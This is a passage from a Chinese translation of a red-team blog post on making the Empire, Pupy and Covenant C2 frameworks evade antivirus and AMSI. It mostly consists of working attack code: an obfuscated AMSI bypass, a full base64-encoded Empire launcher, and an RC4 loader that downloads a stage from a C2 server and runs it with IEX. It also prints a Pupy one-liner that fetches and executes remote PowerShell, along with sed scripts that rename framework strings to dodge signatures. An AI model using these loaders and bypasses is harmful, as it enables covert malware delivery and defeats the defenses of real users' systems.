class="type">SYStEm.NEt.CRedEnTiALCAcHe</span>]::DeFAuLtNetworkCrEDeNTIals</span><br><span class="line"><span class="variable">$Script:Proxy</span> = <span class="variable">$5793</span>.Proxy;<span class="variable">$K</span>=[<span class="type">SyStEM.TexT.EnCodiNG</span>]::ASCII.GEtByTES(<span class="string">&#x27;GeXSZo)tD2;&#125;C,Rf9YjJ6V]&#123;vOd%IE&amp;(&#x27;</span>)</span><br><span class="line"><span class="variable">$R</span>=&#123;<span class="variable">$D</span>,<span class="variable">$K</span>=<span class="variable">$ArgS</span>;<span class="variable">$S</span>=<span class="number">0</span>..<span class="number">255</span>;<span class="number">0</span>..<span class="number">255</span>|%&#123;<span class="variable">$J</span>=(<span class="variable">$J</span>+<span class="variable">$S</span>[<span class="variable">$_</span>]+<span class="variable">$K</span>[<span class="variable">$_</span>%<span class="variable">$K</span><span class="type">.CoUNt</span>])%<span class="number">256</span>;<span class="variable">$S</span>[<span class="variable">$_</span>],<span class="variable">$S</span>[<span class="variable">$J</span>]=<span class="variable">$S</span>[<span class="variable">$J</span>],<span class="variable">$S</span>[<span class="variable">$_</span>]&#125;;<span class="variable">$D</span>|%&#123;<span class="variable">$I</span>=(<span class="variable">$I</span>+<span class="number">1</span>)%<span class="number">256</span>;<span class="variable">$H</span>=(<span class="variable">$H</span>+<span class="variable">$S</span>[<span class="variable">$I</span>])%<span class="number">256</span>;<span class="variable">$S</span>[<span class="variable">$I</span>],<span class="variable">$S</span>[<span class="variable">$H</span>]=<span class="variable">$S</span>[<span class="variable">$H</span>],<span class="variable">$S</span>[<span class="variable">$I</span>]</span><br><span class="line"><span class="variable">$_</span><span class="operator">-bXoR</span><span class="variable">$S</span>[(<span class="variable">$S</span>[<span class="variable">$I</span>]+<span class="variable">$S</span>[<span class="variable">$H</span>])%<span class="number">256</span>]&#125;&#125;;<span class="variable">$5793</span>.HeaDeRs.ADD(<span class="string">&quot;Cookie&quot;</span>,<span class="string">&quot;AarUqjaPWAVN=ObRsC2VPu0rVrs26IR+01e5Wk/w=&quot;</span>)</span><br><span class="line"><span class="variable">$daTa</span>=<span class="variable">$5793</span>.DowNlOadDAta(<span class="variable">$SER</span>+<span class="variable">$T</span>);<span class="variable">$iv</span>=<span class="variable">$daTa</span>[<span class="number">0</span><span class="type">..3</span>];<span class="variable">$DATa</span>=<span class="variable">$DAta</span>[<span class="number">4</span><span class="type">..</span><span class="variable">$dAta</span><span class="type">.LeNgth</span>];<span class="operator">-join</span>[<span class="built_in">ChAr</span>[]](&amp; <span class="variable">$R</span> <span class="variable">$dATa</span> (<span class="variable">$IV</span>+<span class="variable">$K</span>))|<span class="built_in">IEX</span></span><br></pre></td></tr></table></figure><p>如果 Powershell 版本为 2 或更低的话，则根本不会执行启动器的很大一部分。那是因为 Powershell v2 没有 AMSI 和脚本块记录日志支持。在 if 语句之间，各个保护机制有不同的 bypass，一个脚本块日志记录 bypass 和一个 AMSI bypass。</p><p>你可以在 Empire 的 lib/common/bypasses.py 文件中修改任何 Empire bypass：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/Bypasses_py.jpg" alt=""></p><p>如果你想知道如何创建自己的自定义 bypass，建议你来阅读我较早写的一篇 Blog -&gt; <a target="_blank" rel="noopener" href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">Post Bypass AMSI by manual modification</a>。</p><p>让我们再次使用 <a target="_blank" rel="noopener" href="https://github.com/RythmStick/AMSITrigger/tree/master/AMSITrigger">AMSITrigger</a> 查找我们的 Empire 启动器的 AMSI 触发器：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/AMSITriggerBase64.jpg" alt=""></p><p>在命令行下，用触发器处理这些 base64 很容易，因为 base64 签名无效，它只是完整 base64 字符串的一部分。但是，例如将 <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">CyberChef</a> 与 From Base64 配合使用：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/CyberChef.jpg" alt=""></p><p>这确实是 AMSI bypass，它是第一个触发器。</p><p>我们将使用一个 <a target="_blank" rel="noopener" href="https://amsi.fail/">Amsi.fail</a> Payload 来创建具有自定义签名的现有 bypass：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Matt Graebers Reflection method </span></span><br><span class="line">[<span class="type">Ref</span>].AsSEMbly.GeTtype(<span class="string">&#x27;System.Management.Automation.&#x27;</span>+<span class="variable">$</span>([<span class="type">SYsTeM.NET.weButIlity</span>]::HTmLDEcodE(<span class="string">&#x27;&amp;#65;&amp;#109;&amp;#115;&amp;#105;&#x27;</span>))+<span class="string">&#x27;Utils&#x27;</span>).GetField(<span class="string">&#x27;&#x27;</span>+<span class="variable">$</span>([<span class="built_in">CHAr</span>]([<span class="built_in">BYTe</span>]<span class="number">0</span>x61)+[<span class="built_in">chAR</span>](<span class="number">81</span>+<span class="number">28</span>)+[<span class="built_in">char</span>](<span class="number">211</span><span class="literal">-96</span>)+[<span class="built_in">cHaR</span>](<span class="number">149</span><span class="literal">-44</span>))+<span class="string">&#x27;InitFailed&#x27;</span>,<span class="variable">$</span>([<span class="built_in">CHaR</span>]([<span class="built_in">byTe</span>]<span class="number">0</span>x4E)+[<span class="built_in">ChAr</span>](<span class="number">198</span><span class="literal">-87</span>)+[<span class="built_in">CHaR</span>](<span class="number">1980</span>/<span class="number">18</span>)+[<span class="built_in">CHAR</span>](<span class="number">77</span>+<span class="number">3</span>)+[<span class="built_in">ChAr</span>]([<span class="built_in">Byte</span>]<span class="number">0</span>x75)+[<span class="built_in">CHar</span>](<span class="number">5684</span>/<span class="number">58</span>)+[<span class="built_in">cHAR</span>]([<span class="built_in">BYte</span>]<span class="number">0</span>x6C)+[<span class="built_in">ChAR</span>]([<span class="built_in">BYtE</span>]<span class="number">0</span>x69)+[<span class="built_in">ChaR</span>]([<span class="built_in">BYTE</span>]<span class="number">0</span>x63)+[<span class="built_in">chAR</span>]([<span class="built_in">bYtE</span>]<span class="number">0</span>x2C)+[<span class="built_in">ChAR</span>]([<span class="built_in">Byte</span>]<span class="number">0</span>x53)+[<span class="built_in">cHAR</span>](<span class="number">116</span>)+[<span class="built_in">ChAR</span>](<span class="number">97</span>)+[<span class="built_in">chaR</span>]([<span class="built_in">BytE</span>]<span class="number">0</span>x74)+[<span class="built_in">Char</span>](<span class="number">68</span>+<span class="number">37</span>)+[<span class="built_in">cHAr</span>](<span class="number">78</span>+<span class="number">21</span>))).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>);</span><br></pre></td></tr></table></figure><p>你可以将网站上的新 AMSI bypass 复制粘贴到 lib/common/bypasses.py 的 bypass 变量中。但是取决于 bypass，你可能必须转义一些特殊字符。</p><p>第二个触发器用于与 C2-Framework 的 HTTP 连接：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/CyberChef2.jpg" alt=""></p><p>我们可以看到，来自侦听器选项菜单的 User-Agent，C2-Server 的 base64 编码的 IP 地址，连接的 URL 和被 AMSI 标记的代理设置，因此，让我们在监听器菜单中更改 User-Agent 和 URL 的值：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/DefaultProfile.jpg" alt=""></p><p>新的启动器代码比如像下面这样：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell <span class="literal">-enc</span> SQBGACgAJABQAFMAVgBFAHIAcwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAE8AbgAuAE0AQQBqAG8AUgAgAC0AZwBlACAAMwApAHsAWwBSAGUAZgBdAC4AQQBzAFMARQBNAGIAbAB5AC4ARwBlAFQAdAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACcAKwAkACgAWwBTAFkAcwBUAGUATQAuAE4ARQBUAC4AdwBlAEIAdQB0AEkAbABpAHQAeQBdADoAOgBIAFQAbQBMAEQARQBjAG8AZABFACgAJwAmACMANgA1ADsAJgAjADEAMAA5ADsAJgAjADEAMQA1ADsAJgAjADEAMAA1ADsAJwApACkAKwAnAFUAdABpAGwAcwAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnACcAKwAkACgAWwBDAEgAQQByAF0AKABbAEIAWQBUAGUAXQAwAHgANgAxACkAKwBbAGMAaABBAFIAXQAoADgAMQArADIAOAApACsAWwBjAGgAYQByAF0AKAAyADEAMQAtADkANgApACsAWwBjAEgAYQBSAF0AKAAxADQAOQAtADQANAApACkAKwAnAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACQAKABbAEMASABhAFIAXQAoAFsAYgB5AFQAZQBdADAAeAA0AEUAKQArAFsAQwBoAEEAcgBdACgAMQA5ADgALQA4ADcAKQArAFsAQwBIAGEAUgBdACgAMQA5ADgAMAAvADEAOAApACsAWwBDAEgAQQBSAF0AKAA3ADcAKwAzACkAKwBbAEMAaABBAHIAXQAoAFsAQgB5AHQAZQBdADAAeAA3ADUAKQArAFsAQwBIAGEAcgBdACgANQA2ADgANAAvADUAOAApACsAWwBjAEgAQQBSAF0AKABbAEIAWQB0AGUAXQAwAHgANgBDACkAKwBbAEMAaABBAFIAXQAoAFsAQgBZAHQARQBdADAAeAA2ADkAKQArAFsAQwBoAGEAUgBdACgAWwBCAFkAVABFAF0AMAB4ADYAMwApACsAWwBjAGgAQQBSAF0AKABbAGIAWQB0AEUAXQAwAHgAMgBDACkAKwBbAEMAaABBAFIAXQAoAFsAQgB5AHQAZQBdADAAeAA1ADMAKQArAFsAYwBIAEEAUgBdACgAMQAxADYAKQArAFsAQwBoAEEAUgBdACgAOQA3ACkAKwBbAGMAaABhAFIAXQAoAFsAQgB5AHQARQBdADAAeAA3ADQAKQArAFsAQwBoAGEAcgBdACgANgA4ACsAMwA3ACkAKwBbAGMASABBAHIAXQAoADcAOAArADIAMQApACkAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABlAE0ALgBOAEUAVAAuAFMAZQByAFYAaQBjAGUAUABvAEkAbgBUAE0AQQBOAEEARwBlAFIAXQA6ADoARQBYAHAAZQBDAFQAMQAwADAAQwBPAG4AdABpAE4AdQBFAD0AMAA7ACQAYgAzADkAMAA0AD0ATgBlAHcALQBPAEIAagBFAEMAVAAgAFMAWQBTAFQAZQBtAC4ATgBFAHQALgBXAGUAQgBDAGwASQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAAMQAwAC4AMAA7ACAAVwBpAG4ANgA0ADsAIAB4ADYANAA7ACAAcgB2ADoANwAwAC4AMAApACAARwBlAGMAawBvAC8AMgAwADEAMAAwADEAMAAxACAARgBpAHIAZQBmAG8AeAAvADcAMAAuADAAJwA7ACQAcwBlAHIAPQAkACgAWwBUAEUAeABUAC4ARQBOAEMATwBEAGkAbgBHAF0AOgA6AFUATgBJAEMAbwBkAEUALgBHAGUAdABTAFQAUgBpAE4AZwAoAFsAQwBPAE4AdgBFAHIAVABdADoAOgBGAHIAbwBNAEIAYQBTAEUANgA0AFMAdABSAEkATgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAGsAQQBNAGcAQQB1AEEARABFAEEATgBnAEEANABBAEMANABBAE0AUQBBAHcAQQBEAEEAQQBMAGcAQQB4AEEARABNAEEATQBRAEEANgBBAEQAZwBBAE0AQQBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBfAGwAYQB5AG8AdQB0AHMALwAxADUALwBxAHUAaQBjAGsAbABpAG4AawBzAGQAaQBhAGwAbwBnAGYAbwByAG0ALgBhAHMAcAB4AD8AUABpAGMAawBlAHIARABpAGEAbABvAGcAVAB5AHAAZQA9AE0AaQBjAHIAbwBzAG8AZgB0AC4AUwBoAGEAcgBlAFAAbwBpAG4AdAAuAFcAZQBiAEMAbwBuAHQAcgBvAGwAcwAuAEkAdABlAG0AUABpAGMAawBlAHIARABpAGEAbABvAGcAJwA7ACQAQgAzADkAMAA0AC4ASABFAEEAZABFAFIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAYgAzADkAMAA0AC4AUAByAG8AWABZAD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBlAEIAUgBFAFEAVQBFAFMAdABdADoAOgBEAEUARgBBAFUATABUAFcAZQBCAFAAcgBvAHgAeQA7ACQAYgAzADkAMAA0AC4AUAByAE8AWABZAC4AQwBSAEUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwB5AFMAdABlAE0ALgBOAEUAVAAuAEMAcgBlAGQAZQBuAHQASQBBAGwAQwBBAGMAaABFAF0AOgA6AEQAZQBmAGEAVQBsAHQATgBlAHQAdwBPAHIAawBDAFIARQBEAGUATgB0AGkAYQBMAFMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAYgAzADkAMAA0AC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAFkAcwBUAEUATQAuAFQAZQB4AFQALgBFAE4AQwBvAGQASQBuAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQAZQBTACgAJwBHAGUAWABTAFoAbwApAHQARAAyADsAfQBDACwAUgBmADkAWQBqAEoANgBWAF0AewB2AE8AZAAlAEkARQAmACgAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AVQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABCADMAOQAwADQALgBIAEUAQQBkAGUAUgBzAC4AQQBEAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEEAYQByAFUAcQBqAGEAUABXAEEAVgBOAD0AbQAyADQAMgBkADYAWAA2AHoAbQBwADgAQQBEAHkAaQB6ADAAMwA4AGQAVQBxAGQARwBwAHMAPQAiACkAOwAkAGQAYQB0AEEAPQAkAEIAMwA5ADAANAAuAEQATwB3AG4AbABvAEEARABEAEEAVABhACgAJABTAEUAUgArACQAVAApADsAJABJAHYAPQAkAEQAYQBUAEEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AEEAPQAkAEQAQQB0AGEAWwA0AC4ALgAkAEQAQQBUAGEALgBsAGUAbgBHAFQAaABdADsALQBKAE8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA</span><br></pre></td></tr></table></figure><p>AMSITrigger 返回 <code>[+] AMSI_RESULT_NOT_DETECTED</code>，执行将导致代理连接成功：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/Agent.jpg" alt=""></p><p>Empire 中的所有模块怎么样？他们使用的脚本也被 AMSI 检测到，Empire 使用模块创建新的进程，因此，每次使用模块时，我们都需要一个新的 bypass，我们有两种选择：</p><ul><li>我们可以修改 <code>data/module_source/</code> 目录中的每个 .ps1 文件，以便 AMSI 不会标记任何文件。如果你还修改了默认的 stage2 脚本数据 <code>/agent/stagers/http.ps1</code>，那么你甚至根本不需要任何 AMSI bypass。 这是一项非常大的一次性工作，但是检测变得更加困难。如何修改脚本？ 看看较旧的博客文章；</li><li>我们可以将模块选项 <code>AMSIBypass</code> 和 <code>Obfuscate</code> 设置为 true，以确保不再标记模块。一个不足之处是，通过不禁用脚本块日志记录，检出率非常高。</li></ul><p><img src="https://image.zeronohacker.com/article/2020/11/18/EmpireParameters.jpg" alt=""></p><p>混淆处理对具有给定选项的每个模块都使用 <a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a>。我个人的经验是，与使用 <code>AMSIBypass</code> 和 <code>Obfuscate</code> 相比，逐个修改每个脚本更有效，更可靠。</p><h2 id="Pupy-C2"><a href="#Pupy-C2" class="headerlink" title="Pupy C2"></a>Pupy C2</h2><p><a target="_blank" rel="noopener" href="https://github.com/n1nj4sec/pupy">Pupy C2</a> 有两个非常不错的主要功能，到目前为止，我在其他开源框架中测试中都没有看到过有哪个有这两个好用的功能：</p><ul><li>Windows Payload 使用反射式 DLL 从内存中加载整个 Python 解释器，因此只要添加了依赖库，任何 Python 脚本都可以在内存中加载并执行；</li><li>交互式 shell 模块使得自动完成功能的全功能命令行 shell 程序成为可能，这就像在打开了 cmd 的远程系统上一样；</li><li>支持 linux；</li></ul><p>可在内存中加载并执行 Python 代码，例如 <a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a> 就是这么做，也可作为一个集成模块。在我个人看来，<code>LaZagne</code> 是 Windows 环境下凭据的通行证，使用 <a target="_blank" rel="noopener" href="https://github.com/skelsec/pypykatz">pypykatz</a> 来获取 lsass 凭据，浏览器凭据以及一些 sysadmin-tool 凭据。如果有人在未安装 Python 的 Windows 主机上的内存中找到用于执行 LaZagne 的方法 (通过 Powershell 或 .NET 二进制文件)，我会将我的 DMs 都开放，这是我尝试过的许多个人项目中的一个。</p><p>Pupy 还具有从 Android 软件包到 Linux Binaries，Windows PE Executables 和 Powershell 以及 Python oneliners 的多个 stager 选项：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/Pupystagers.jpg" alt=""></p><p>生成 Windows Powershell oneliner 就像 <code>gen -f ps1_oneliner -O windows</code> 一样简单：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/PupyStager.jpg" alt=""></p><p>Pupy 默认使用两个端口，一个用于托管 Payload 的 Web 服务器，另一个用于通过加密通道的传入连接和 C2-Command。Powershell oneliners 只需从 pupy Web 服务器加载脚本，这些脚本非常庞大，因为它们包含整个 Python 解释器。因此，加载 Stage2 有时可能需要一段时间。Web 服务器的 Pupy Powershell 文件位于目录 <code>/root/.config/pupy/data/wwwroot/</code> 中。 让我们看一下名为 7BLd42qxkI 的 Stage1 Payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;aWYgKCRFbnY6UFJPQ0VTU09SX0FSQ0hJVEVDVFVSRSAtZXEgJ0FNRDY0Jyl7IElFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC4xMDAuMTMxOjQ0My96UkZ0aElLVElWL0tzb3RYa1Q4WkYnKTsgfSBlbHNlIHsgSUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEwMC4xMzE6NDQzL3pSRnRoSUtUSVYvekxpRHJHTnpHdCcpOyB9&#x27;</span>));<span class="built_in">iex</span> <span class="variable">$code</span></span><br></pre></td></tr></table></figure><p>Stage2 既不是 x86 也不是 x64，这取决于受害者的系统，并且包含主要的代理代码。Stage2 的大小超过 9MB，因此在这里我不会显示代码，但是我可以解释 pupy 在做什么。</p><p>Pupy 正在通过 <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/n1nj4sec/pupy/unstable/pupy/external/PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1">Invoke-ReflectivePEInjection.ps1</a> 将 C 编译的代理可执行文件加载到内存中。如果你阅读过我以前的博客文章，就知道此脚本已被 AMSI 标记。此脚本及其 AmsiTrigger.exe 是撰写本文时针对 Pupy Powershell Payload 的唯一检测技术。因此，如果将 <code>Invoke-ReflectivePEInjection.ps1</code> 替换为自定义的修改版本，你将不会再遇到任何 AV 问题。我在以前的博客文章 <a target="_blank" rel="noopener" href="https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/">Bypass AMSI by manual modification part II – Invoke-Mimikatz</a> 里就做了一个，它位于 <a target="_blank" rel="noopener" href="https://gist.github.com/S3cur3Th1sSh1t/1bd87a34c2f84fe6695b89ad701f514f">本要点</a> 中。这个我在两个月前就公开了，但是由于它是公开的，所以有了新的触发器：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/PE-Reflect.jpg" alt=""></p><p>更改这些触发器会产生其他新的触发器，AMSITrigger 最近更新了，因此你现在可以通过参数选择 chunk 大小和最大签名大小值。你可以使用这些参数去找所有手动修改的触发器：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/MoreTriggers.jpg" alt=""></p><p>将生成的 AMSI-Clean 脚本复制到相应的 Pupy 位置，然后在 Pupy 主文件夹中运行以下命令以逃避检测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/Invoke-ReflectivePEInjection/PE-Reflect/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/\$PEBytes/\$PupBytes/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/\$code/\$script/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/\$data/\$encrypted/g&quot;</span><br></pre></td></tr></table></figure><p>编写本文这段时间内，在没有修补 Amsi.dll 的情况下，此方法应该能绕过大多数 AV 厂商的产品。</p><p>逃避 AV 检测的更简单方法是将 AMSI-Bypass 放在 Stage1 脚本的第一行：</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/AMSIStage1.jpg" alt=""></p><p>每个模块都能让 Pupy 绕过 AMSI，因为都在同一进程中加载，因此只需其中之一就足够了。</p><h2 id="Covenant"><a href="#Covenant" class="headerlink" title="Covenant"></a>Covenant</h2><p>Covenant 是一个非常直观的 C2-Framework，可在 board 与最重要的 C2-模块一起使用。我现在在 RTO 实验室中使用了大约 2 个月，对此 C2-Framework 有很多感想。它提供的好处如下：</p><ul><li>直观，有易于操作的 GUI；</li><li>在某些情况下，对 GUI 中有关代码部分的修改，针对 Stagers 和 Executor 的修改以及可以轻松集成新插件的选项均会有所帮助；</li><li>可在内存中执行 C# 代码以及运用了 Powerpick 技术的 Powershell 脚本加载能够让 Covenant 可以使用几乎所有相关的开源 Red-Team 工具；</li></ul><p>但是，我错过了功能强大的 Port-Forwarding 选项以及 socks-proxy 模块，这在几种关键情况下都是必需的。在某些情况下，我还经历了整个框架的崩溃，有时只能通过删除整个数据库文件并重新启动框架来解决。这些问题有待解决，所以我希望它们能尽快解决，以确保操作顺利。</p><p>Covenant 可以选择生成多个不同的 stagers。 如果你已经知道 Covenant 并想知道 <code>Otto</code> 而不是 <code>Grunt</code>，请继续阅读。</p><p><img src="https://image.zeronohacker.com/article/2020/11/18/Launchers.jpg" alt=""></p><p>主要的 stagers 包括 InstallUtil-Execution，MSBuild 和 Powershell-Stagers 以及由 <a target="_blank" rel="noopener" href="https://github.com/TheWover/donut">donut</a> 生成的 Shellcode 或 .NET 二进制文件。对于旧版 Windows 系统，可以使用 <a target="_blank" rel="noopener" href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a> 启动器。</p><p>在 GruntHTTP 模板和 GruntSMB 模板中都可以找到与所有 stagers 相关的代码部分，该代码可在 GUI 修改和查看。</p><p>就像我之前写的那篇博客文章一样，我选择了字符串替换方式来逃避 AV 的检测。为了不破坏子模块或嵌入资源 (如 DLL 文件) 的任何功能，我们首先必须备份它们：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">sudo git clone --recurse-submodules https://github.com/cobbr/Covenant /opt/Covenant</span><br><span class="line">cd /opt/Covenant/Covenant/</span><br><span class="line">mv ./Data/AssemblyReferences/ ../AssemblyReferences/</span><br><span class="line">mv ./Data/ReferenceSourceLibraries/ ../ReferenceSourceLibraries/</span><br><span class="line">mv ./Data/EmbeddedResources/ ../EmbeddedResources/</span><br></pre></td></tr></table></figure><p>这次，我考虑要进行尽可能多的更改以便逃避尽可能多的 AV 供应商。Covenant 在代码库中使用的最明显的单词是 <code>Grunt</code> 和 <code>Covenant</code>。替换它们需要更改目录名称以及文件的内容，可以通过以下 bash 脚本完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mv ./Models/Covenant/ ./Models/EasyPeasy/</span><br><span class="line">mv ./Components/CovenantUsers/ ./Components/EasyPeasyUsers/</span><br><span class="line">mv ./Components/Grunts/ ./Components/Ottos/</span><br><span class="line">mv ./Models/Grunts/ ./Models/Ottos/</span><br><span class="line">mv ./Data/Grunt/GruntBridge/ ./Data/Grunt/OttoBridge/</span><br><span class="line">mv ./Data/Grunt/GruntHTTP/ ./Data/Grunt/OttoHTTP/</span><br><span class="line">mv ./Data/Grunt/GruntSMB/ ./Data/Grunt/OttoSMB/</span><br><span class="line">mv ./Components/GruntTaskings/ ./Components/OttoTaskings/</span><br><span class="line">mv ./Components/GruntTasks/ ./Components/OttoTasks/</span><br><span class="line">mv ./Data/Grunt/ ./Data/Otto/</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/Grunt/Otto/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/GRUNT/OTTO/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/grunt/otto/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/Covenant/EasyPeasy/g&quot;</span><br><span class="line">find ./ -type f -print0 | xargs -0 sed -i &quot;s/COVENANT/EASYPEASY/g&quot;</span><br><span class="line">find ./ -type f -name &quot;*Grunt*&quot; | while read FILE ; do</span><br><span class="line">	newfile=&quot;$(echo $&#123;FILE&#125; |sed -e &quot;s/Grunt/Otto/g&quot;)&quot;;</span><br><span class="line">	mv &quot;$&#123;FILE&#125;&quot; &quot;$&#123;newfile&#125;&quot;;</span><br><span class="line">done</span><br><span class="line">find ./ -type f -name &quot;*GRUNT*&quot; | while read FILE ; do</span><br><span class="line">	newfile=&quot;$(echo $&#123;FILE&#125; |sed -e &quot;s/GRUNT/OTTO/g&quot;)&quot;;</span><br><span class="line">	mv &quot;$&#123;FILE&#125;&quot; &quot;$&#123;newfile&#125;&quot;;</span><br><span class="line">done</span><br><span class="line">find ./ -type f -name &quot;*grunt*&quot; | while read FILE ; do</span><br><span class="line">	newfile=&quot;$(echo $&#123;FILE&#125; |sed -e &quot;s/grunt/otto/g&quot;)&quot;;</span><br><span class="line">	mv &quot;$&#123;FILE&#125;&quot; &quot;$&#123;newfile&#125;&quot;;</span><br><span class="line">done</span><br><span class="line">find ./ -type f -name &quot;*Covenant*&quot; | while read FILE ; do</span><br><span class="line">	newfile=&quot;$(echo $&#123;FILE&#125; |sed -e &quot;s/Covenant/EasyPeasy/g&quot;)&quot;;</span><br><span class="line">	mv &quot;$&#123;FILE&#125;&quot; &quot;$&#123;newfile&#125;&quot;;</span><br><span class="line">done</span><br><span class="line">find ./ -type f -name &quot;*COVENANT*&quot; | while read FILE ; do</span><br><span class="line">	newfile=&quot;$(echo $&#123;FILE&#125; |sed -e &quot;s/COVENANT/EASYPEASY/g&quot;)&quot;;</span><br><span class="line">	mv &quot;$&#123;FILE&#125;&quot; &quot;$&#123;newfile&#125;&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>通过更改 <code>Grunt</code> 一词，Covenant 中的几个命令也将被重命名。因此，在这种情况下，必须使用 <code>OttoWMI</code> 代替 <code>GruntWMI</code> 进行横向移动。</p><p>之后，我看了看 <code>GruntHTTP</code> 以及 <code>GruntSMB</code> 模板，还通过 IlSpy 反编译了 Grunt 